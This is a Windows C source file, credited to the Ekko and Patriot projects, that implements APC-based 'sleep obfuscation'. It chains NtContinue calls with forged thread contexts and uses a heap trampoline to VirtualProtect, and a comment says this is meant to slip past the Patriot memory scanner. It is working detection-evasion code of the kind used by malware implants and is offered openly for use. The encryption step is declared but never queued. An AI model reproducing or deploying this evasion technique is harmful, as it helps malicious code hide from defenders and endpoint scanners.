/*++
Credit to:
@5pider for Ekko
* (https://github.com/Cracked5pider/Ekko)
@dez_ for patriot
* https://github.com/joe-desimone/patriot
--*/

#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

#define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
#define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )

void SleepAPC( DWORD SleepTime )
{
    CONTEXT CtxThread = { 0 };

    CONTEXT RopProtRW = { 0 };
    CONTEXT RopMemEnc = { 0 };
    CONTEXT RopDelay = { 0 };
    CONTEXT RopMemDec = { 0 };
    CONTEXT RopProtRX = { 0 };

    HANDLE  hNewWaitObject;
    PVOID   ImageBase = NULL;
    DWORD   ImageSize = 0;
    DWORD   OldProtect = 0;

    CHAR    KeyBuf[16] = { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };

    UNICODE_STRING Key = { 0 };
    UNICODE_STRING Img = { 0 };

    PVOID   NtContinue = NULL;
    PVOID   SysFunc032 = NULL;

    NtContinue = GetProcAddress( GetModuleHandleA( "NTDLL.dll" ), "NtContinue" );
    SysFunc032 = GetProcAddress( (LoadLibraryA( "CRYPTSP.dll" ), GetModuleHandleA( "CRYPTSP.dll" )), "SystemFunction032" );

    ImageBase = GetModuleHandleA( NULL );
    ImageSize = ((PIMAGE_NT_HEADERS)((DWORD64)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;

    Key.Buffer = KeyBuf;
    Key.Length = Key.MaximumLength = 16;

    Img.Buffer = ImageBase;
    Img.Length = Img.MaximumLength = ImageSize;

    /// Patriot will not find this as RIP will point to this 
    /// allocated heap address
    UCHAR trampo[] = {
    0x48, 0xb8, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xFF, 0xE0
    };
    SIZE_T uSize = sizeof( trampo );
    *(DWORD64*)&trampo[2] = (DWORD64)GetProcAddress( GetModuleHandleA( "KERNEL32.dll" ), "VirtualProtect" );
    LPVOID tramp = VirtualAlloc( NULL, uSize, MEM_COMMIT, PAGE_READWRITE );
    memcpy( tramp, trampo, uSize );
    VirtualProtect( tramp, uSize, PAGE_EXECUTE_READ, &OldProtect );
    
    OldProtect = 0;


    /// Queue APC to capture current context
    if( QueueUserAPC( RtlCaptureContext, NtCurrentThread(), (ULONG_PTR)&CtxThread ) )
    {
        /// Alertable state
        SleepEx( 0, TRUE );

        memcpy( &RopProtRW, &CtxThread, sizeof( CONTEXT ) );
        memcpy( &RopMemEnc, &CtxThread, sizeof( CONTEXT ) );
        memcpy( &RopDelay, &CtxThread, sizeof( CONTEXT ) );
        memcpy( &RopMemDec, &CtxThread, sizeof( CONTEXT ) );
        memcpy( &RopProtRX, &CtxThread, sizeof( CONTEXT ) );

        // VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
        RopProtRW.Rsp -= 8;
        RopProtRW.Rip = tramp;
        RopProtRW.Rcx = ImageBase;
        RopProtRW.Rdx = ImageSize;
        RopProtRW.R8 = PAGE_READWRITE;
        RopProtRW.R9 = &OldProtect;

        // WaitForSingleObject( hTargetHdl, SleepTime );
        RopDelay.Rsp -= 8;
        RopDelay.Rip = WaitForSingleObject;
        RopDelay.Rcx = NtCurrentProcess();
        RopDelay.Rdx = SleepTime;

        // VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
        RopProtRX.Rsp -= 8;
        RopProtRX.Rip = tramp;
        RopProtRX.Rcx = ImageBase;
        RopProtRX.Rdx = ImageSize;
        RopProtRX.R8 = PAGE_EXECUTE_READWRITE;
        RopProtRX.R9 = &OldProtect;

        // FIFO
        QueueUserAPC( NtContinue, NtCurrentThread(), (DWORD64)&RopProtRW );
        QueueUserAPC( NtContinue, NtCurrentThread(), (DWORD64)&RopDelay );
        QueueUserAPC( NtContinue, NtCurrentThread(), (DWORD64)&RopProtRX );
        
        // Put alertable
        SleepEx( 0, TRUE );
    }

    if( tramp ) {
        VirtualFree( tramp, 0, MEM_RELEASE );
    }
}

int main()
{
    do {
        printf( "Starting.\n" );
        // Start Sleep Obfuscation
        SleepAPC( 4 * 1000 );
        Sleep( 2000 );
        printf( "Looping.\n" );
    } while( TRUE );
}
